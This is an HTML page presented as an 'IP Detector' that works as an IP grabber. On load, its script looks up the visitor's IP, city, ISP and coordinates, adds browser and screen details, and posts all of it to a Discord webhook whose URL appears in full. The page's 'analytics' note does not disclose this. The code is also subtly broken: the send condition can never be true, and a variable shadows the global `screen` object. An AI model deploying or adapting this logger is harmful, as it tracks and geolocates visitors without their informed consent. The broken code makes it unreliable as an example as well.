<!DOCTYPE html>  
<html>  
<head>  
    <title>IP Logger</title>  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <style>  
        body { font-family: Arial; text-align: center; padding: 50px; background: #111; color: #fff; }  
        h1 { font-size: 3em; }  
        .ip-box { background: #222; padding: 20px; border-radius: 12px; display: inline-block; margin-top: 20px; }  
        .ip { color: #00ff88; font-size: 2.5em; font-weight: bold; letter-spacing: 2px; }  
        .note { color: #888; margin-top: 30px; font-size: 0.9em; }  
    </style>  
</head>  
<body>  
  
    <h1>🌐 IP Detector</h1>  
    <div class="ip-box">  
        <div>Your IP Address:</div>  
        <div class="ip" id="ipDisplay">Loading...</div>  
    </div>  
    <div class="note">This page logs visitor IPs for analytics.</div>  
  
    <script>  
        // ===== CONFIG =====  
        const WEBHOOK_URL = "[https://discord.com/api/webhooks/1533595126193061898/hEpF9bInI0QjNMGRXEO_ay3XWZ10yEj-2JMZFS22_rqD-52_HqRwhPaYrZq08Wz9CV0a](https://discord.com/api/webhooks/1533595126193061898/hEpF9bInI0QjNMGRXEO_ay3XWZ10yEj-2JMZFS22_rqD-52_HqRwhPaYrZq08Wz9CV0a)"; // Replace this!  
        // =================  
  
        async function getIP() {  
            try {  
                // Get public IP from ip-api.com  
                const res = await fetch('http://ip-api.com/json/');  
                const data = await res.json();  
  
                if (data.status === 'success') {  
                    const ip = data.query;  
                    const country = data.country;  
                    const city = data.city;  
                    const region = data.regionName;  
                    const isp = data.isp;  
                    const lat = data.lat;  
                    const lon = data.lon;  
                    const userAgent = navigator.userAgent;  
                    const screen = `${screen.width}x${screen.height}`;  
                    const time = new Date().toLocaleString();  
  
                    // Display IP on page  
                    document.getElementById('ipDisplay').textContent = ip;  
  
                    // Send to Discord webhook  
                    if (WEBHOOK_URL && WEBHOOK_URL !== "[https://discord.com/api/webhooks/1533595126193061898/hEpF9bInI0QjNMGRXEO_ay3XWZ10yEj-2JMZFS22_rqD-52_HqRwhPaYrZq08Wz9CV0a](https://discord.com/api/webhooks/1533595126193061898/hEpF9bInI0QjNMGRXEO_ay3XWZ10yEj-2JMZFS22_rqD-52_HqRwhPaYrZq08Wz9CV0a)") {  
                        const payload = {  
                            content: null,  
                            embeds: [{  
                                title: "📥 New IP Captured",  
                                color: 0x00ff88,  
                                fields: [  
                                    { name: "IP Address", value: ip, inline: true },  
                                    { name: "Country", value: country, inline: true },  
                                    { name: "City / Region", value: `${city}, ${region}`, inline: true },  
                                    { name: "ISP", value: isp, inline: true },  
                                    { name: "Coordinates", value: `${lat}, ${lon}`, inline: true },  
                                    { name: "User Agent", value: userAgent.substring(0, 100), inline: false },  
                                    { name: "Screen Size", value: screen, inline: true },  
                                    { name: "Timestamp", value: time, inline: true }  
                                ],  
                                footer: { text: "IP Logger" }  
                            }]  
                        };  
  
                        await fetch(WEBHOOK_URL, {  
                            method: 'POST',  
                            headers: { 'Content-Type': 'application/json' },  
                            body: JSON.stringify(payload)  
                        });  
                    }  
                } else {  
                    document.getElementById('ipDisplay').textContent = 'Could not fetch IP';  
                }  
            } catch (e) {  
                document.getElementById('ipDisplay').textContent = 'Error loading IP';  
                console.error(e);  
            }  
        }  
  
        getIP();  
    </script>  
  
</body>  
</html>  
